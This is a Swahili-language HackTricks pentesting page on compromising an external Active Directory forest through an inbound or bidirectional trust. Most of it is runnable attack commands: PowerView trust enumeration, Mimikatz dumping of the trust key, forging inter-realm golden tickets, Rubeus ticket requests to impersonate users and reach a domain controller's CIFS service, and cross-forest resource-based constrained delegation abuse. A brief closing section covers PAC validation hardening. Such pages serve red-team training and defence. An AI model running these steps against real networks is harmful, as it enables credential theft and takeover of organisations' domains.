# Domain ya Msitu wa Nje - OneWay (Inbound) au bidirectional

{{#include ../../banners/hacktricks-training.md}}

Katika tukio hili domain ya nje inakuamini (au wote wawili wanawaaminiana), hivyo unaweza kupata aina fulani ya upatikanaji juu yake.

## Uorodheshaji

Kwanza kabisa, unahitaji **kuorodhesha** **trust**:
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM

# Get name of DC of the other domain
Get-DomainComputer -Domain domain.external -Properties DNSHostName
dnshostname
-----------
dc.domain.external

# Groups that contain users outside of its domain and return its members
Get-DomainForeignGroupMember -Domain domain.external
GroupDomain             : domain.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
MemberDomain            : domain.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
DC=external

# Get name of the principal in the current domain member of the cross-domain group
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\External Admins

# Get members of the cros-domain group
Get-DomainGroupMember -Identity "External Admins" | select MemberName
MemberName
----------
crossuser

# Lets list groups members
## Check how the "External Admins" is part of the Administrators group in that DC
Get-NetLocalGroupMember -ComputerName dc.domain.external
ComputerName : dc.domain.external
GroupName    : Administrators
MemberName   : SUB\External Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

# You may also enumerate where foreign groups and/or users have been assigned
# local admin access via Restricted Group by enumerating the GPOs in the foreign domain.

# Additional trust hygiene checks (AD RSAT / AD module)
Get-ADTrust -Identity domain.external -Properties SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation,ForestTransitive
```
> `SelectiveAuthentication`/`SIDFiltering*` unakuruhusu kuona haraka ikiwa cross-forest abuse paths (RBCD, SIDHistory) zinaweza kufanya kazi bila mahitaji ya ziada.

Katika enumeration iliyopita iligundulika kuwa mtumiaji **`crossuser`** yuko ndani ya kikundi **`External Admins`** ambacho kina **Admin access** ndani ya **DC of the external domain**.

## Upatikanaji wa Awali

Ikiwa hukupata ruhusa maalum yoyote ya mtumiaji wako katika domain nyingine, bado unaweza kurudi kwenye AD Methodology na kujaribu privesc from an unprivileged user (mambo kama kerberoasting kwa mfano):

Unaweza kutumia **Powerview functions** ili **enumerate** domain nyingine kwa kutumia param ya `-Domain` kama ifuatavyo:
```bash
Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
```
{{#ref}}
./
{{#endref}}

## Impersonation

### Logging in

Kwa kutumia njia ya kawaida na nyaraka za watumiaji walio na ufikiaji wa domain ya nje, unapaswa kuwa na uwezo wa kufikia:
```bash
Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
```
### SID History Matumizi mabaya

Unaweza pia kutumia [**SID History**](sid-history-injection.md) kupitia forest trust.

If a user is migrated **kutoka forest moja hadi nyingine** and **SID Filtering is not enabled**, inakuwa inawezekana **kuongeza SID kutoka forest nyingine**, na hii **SID** itakuwa **imeongezwa** kwenye **token ya mtumiaji** wakati wa kuji-authenticate **kupitia trust**.

> [!WARNING]
> Kumbuka, unaweza kupata signing key kwa kutumia
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
> ```

Unaweza **kusaini kwa** key ya **trusted** **TGT impersonating** mtumiaji wa domain ya sasa.
```bash
# Get a TGT for the cross-domain privileged user to the other domain
Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Njia kamili ya kujifanya mtumiaji
```bash
# Get a TGT of the user with cross-domain permissions
Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

# Get a TGT from the current domain for the target domain for the user
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Cross-forest RBCD when you control a machine account in the trusting forest (no SID filtering / selective auth)

Ikiwa foreign principal (FSP) inakuweka katika kikundi kinachoweza kuandika computer objects katika trusting forest (kwa mfano, `Account Operators`, custom provisioning group), unaweza kusanidi **Resource-Based Constrained Delegation** kwenye host lengwa wa msitu huo na kuiga mtumiaji yeyote huko:
```bash
# 1) From the trusted domain, create or compromise a machine account (MYLAB$) you control
# 2) In the trusting forest (domain.external), set msDS-AllowedToAct on the target host for that account
Set-ADComputer -Identity victim-host$ -PrincipalsAllowedToDelegateToAccount MYLAB$
# or with PowerView
Set-DomainObject victim-host$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$sidbytes_of_MYLAB}

# 3) Use the inter-forest TGT to perform S4U to victim-host$ and get a CIFS ticket as DA of the trusting forest
Rubeus.exe s4u /ticket:interrealm_tgt.kirbi /impersonate:EXTERNAL\Administrator /target:victim-host.domain.external /protocol:rpc
```
Hii inafanya kazi tu wakati **SelectiveAuthentication is disabled** na **SID filtering** haiondoi SID yako ya udhibiti. Ni njia ya haraka ya lateral ambayo inaepuka SIDHistory forging na mara nyingi hupitwa wakati wa ukaguzi wa trust.

### Kuimarishwa kwa uhalalishaji wa PAC

Sasisho za uhalalishaji wa saini za PAC kwa **CVE-2024-26248**/**CVE-2024-29056** zinaongeza utekelezaji wa saini kwa tiketi za inter-forest. Katika **Compatibility mode**, njia bandia za inter-realm PAC/SIDHistory/S4U bado zinaweza kufanya kazi kwenye DCs ambazo hazijasasishwa. Katika **Enforcement mode**, data za PAC zisizosainiwa au zilizodanganywa zinazovuka forest trust zinakataliwa isipokuwa pia unashikilia ufunguo wa target forest trust. Registry overrides (`PacSignatureValidationLevel`, `CrossDomainFilteringLevel`) zinaweza kudhoofisha hili mradi zinabaki kupatikana.

## References

- [Microsoft KB5037754 – PAC validation changes for CVE-2024-26248 & CVE-2024-29056](https://support.microsoft.com/en-au/topic/how-to-manage-pac-validation-changes-related-to-cve-2024-26248-and-cve-2024-29056-6e661d4f-799a-4217-b948-be0a1943fef1)
- [MS-PAC spec – SID filtering & claims transformation details](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)
{{#include ../../banners/hacktricks-training.md}}
